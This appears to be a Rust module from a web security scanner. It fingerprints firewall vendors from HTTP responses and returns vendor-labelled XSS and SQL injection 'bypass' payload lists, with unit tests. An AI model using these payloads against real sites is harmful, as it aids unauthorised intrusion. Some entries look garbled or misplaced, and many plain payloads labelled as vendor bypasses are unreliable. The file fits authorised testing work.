use std::collections::HashMap;

#[derive(Debug, Clone, serde::Serialize)]
pub struct WafResult {
    pub detected: bool,
    pub vendor: Option<String>,
    pub confidence: u8,
    pub signature: String,
}

pub struct WafDetector;

impl WafDetector {
    pub fn new() -> Self {
        Self
    }

    /// Detect WAF by analyzing HTTP response characteristics.
    pub fn detect(&self, headers: &HashMap<String, String>, body: &str, status: u16) -> WafResult {
        // Check for security headers
        for (name, value) in headers {
            let lower_name = name.to_lowercase();
            let lower_val = value.to_lowercase();

            // Cloudflare
            if lower_name == "server" && lower_val.contains("cloudflare") {
                return WafResult {
                    detected: true,
                    vendor: Some("cloudflare".into()),
                    confidence: 95,
                    signature: format!("server: {}", value),
                };
            }
            if lower_val.contains("__cfduid") || lower_val.contains("cf-ray") {
                return WafResult {
                    detected: true,
                    vendor: Some("cloudflare".into()),
                    confidence: 90,
                    signature: format!("cookie/header: {}", value),
                };
            }

            // AWS WAF / CloudFront
            if lower_name == "x-amz-cf-id" || lower_name == "x-amzn-trace-id" {
                return WafResult {
                    detected: true,
                    vendor: Some("aws_waf".into()),
                    confidence: 85,
                    signature: format!("{}: {}", name, value),
                };
            }

            // Akamai
            if lower_val.contains("akamai") || lower_name == "x-akamai-transformed" {
                return WafResult {
                    detected: true,
                    vendor: Some("akamai".into()),
                    confidence: 90,
                    signature: format!("{}: {}", name, value),
                };
            }

            // ModSecurity / Apache
            if lower_name == "x-powered-by" && lower_val.contains("mod_security") {
                return WafResult {
                    detected: true,
                    vendor: Some("modsecurity".into()),
                    confidence: 85,
                    signature: format!("{}: {}", name, value),
                };
            }

            // F5 BigIP
            if lower_val.contains("bigip") || lower_name.starts_with("x-application-context") {
                return WafResult {
                    detected: true,
                    vendor: Some("f5_bigip".into()),
                    confidence: 85,
                    signature: format!("{}: {}", name, value),
                };
            }

            // Imperva/Incapsula
            if lower_val.contains("incapsula") || lower_name == "x-iinfo" {
                return WafResult {
                    detected: true,
                    vendor: Some("imperva_incapsula".into()),
                    confidence: 85,
                    signature: format!("{}: {}", name, value),
                };
            }

            // Cloudflare block page in body
            if status == 403
                && (body.contains("Attention Required!") || body.contains("cf-error-page"))
            {
                return WafResult {
                    detected: true,
                    vendor: Some("cloudflare".into()),
                    confidence: 95,
                    signature: "Cloudflare challenge/block page".into(),
                };
            }

            // Generic WAF indicators
            if lower_name == "x-sucuri-id" || lower_name == "x-sucuri-cache" {
                return WafResult {
                    detected: true,
                    vendor: Some("sucuri".into()),
                    confidence: 90,
                    signature: format!("{}: {}", name, value),
                };
            }
        }

        // Check body for WAF block pages
        let lower_body = body.to_lowercase();
        if lower_body.contains("mod_security") || lower_body.contains("modsecurity") {
            return WafResult {
                detected: true,
                vendor: Some("modsecurity".into()),
                confidence: 75,
                signature: "body contains mod_security reference".into(),
            };
        }
        if lower_body.contains("cloudflare")
            && (lower_body.contains("block") || lower_body.contains("deny"))
        {
            return WafResult {
                detected: true,
                vendor: Some("cloudflare".into()),
                confidence: 80,
                signature: "body contains Cloudflare block reference".into(),
            };
        }

        WafResult {
            detected: false,
            vendor: None,
            confidence: 0,
            signature: "No WAF detected".into(),
        }
    }

    /// Get WAF-specific bypass payloads for a vendor.
    pub fn bypass_payloads(vendor: &str, vuln_type: &str) -> Vec<String> {
        match vendor {
            "cloudflare" => match vuln_type {
                "xss" => vec![
                    "<script>alert(1)</script>".into(),
                    "<script>alert`1`</script>".into(),
                    "<img src=x onerror=alert(1)>".into(),
                    "<svg/onload=alert(1)>".into(),
                    "%3Cscript%3Ealert(1)%3C/script%3E".into(),
                    "<script>eval(atob('YWxlcnQoMSk='))</script>".into(),
                    "<!--#exec cmd=\"alert(1)\"--><script>alert(1)</script>".into(),
                ],
                "sqli" => vec![
                    "' OR '1'='1".into(),
                    "' OR 1=1--".into(),
                    "/*!50000%27%20OR%201=1--*/".into(),
                    "admin' --".into(),
                    "' /**/OR/**/1=1".into(),
                    "'||1=1||'".into(),
                ],
                _ => vec![],
            },
            "modsecurity" => match vuln_type {
                "xss" => vec![
                    "<script>alert(1)</script>".into(),
                    "<script>alert`1`</script>".into(),
                    "<Img/Src=NOnOnfirm(1)>".into(),
                    "<svg/onload=alert(1)>".into(),
                    "%3Cscript%3Ealert(1)%3C/script%3E".into(),
                    "perl -e 'print \"<script>alert(1)</script>\"'".into(),
                ],
                "sqli" => vec![
                    "' OR '1'='1".into(),
                    "' UNION SELECT 1,2,3--".into(),
                    "' OR 1=1 LIMIT 1--".into(),
                    "'/*!50000*/OR/**/1=1".into(),
                    "'%20OR%201=1".into(),
                ],
                _ => vec![],
            },
            "aws_waf" => match vuln_type {
                "xss" => vec![
                    "<script>alert(1)</script>".into(),
                    "<script>eval(atob('YWxlcnQoMSk='))</script>".into(),
                    "<scr<script>ipt>alert(1)</scr</script>ipt>".into(),
                    "<%00script>alert(1)</%00script>".into(),
                ],
                "sqli" => vec![
                    "' OR '1'='1".into(),
                    "' OR 1=1--".into(),
                    "'||1=1||'".into(),
                    "admin'--".into(),
                ],
                _ => vec![],
            },
            _ => vec![
                // Generic bypass payloads
                "<script>alert(1)</script>".into(),
                "' OR '1'='1".into(),
            ],
        }
    }
}

impl Default for WafDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_detect_cloudflare() {
        let detector = WafDetector::new();
        let mut headers = HashMap::new();
        headers.insert("server".into(), "cloudflare".into());
        let result = detector.detect(&headers, "", 200);
        assert!(result.detected);
        assert_eq!(result.vendor.unwrap(), "cloudflare");
    }

    #[test]
    fn test_no_waf() {
        let detector = WafDetector::new();
        let mut headers = HashMap::new();
        headers.insert("server".into(), "nginx/1.20".into());
        let result = detector.detect(&headers, "", 200);
        assert!(!result.detected);
    }

    #[test]
    fn test_cloudflare_xss_bypass() {
        let payloads = WafDetector::bypass_payloads("cloudflare", "xss");
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("script"));
    }

    #[test]
    fn test_cloudflare_sqli_bypass() {
        let payloads = WafDetector::bypass_payloads("cloudflare", "sqli");
        assert!(!payloads.is_empty());
    }
}
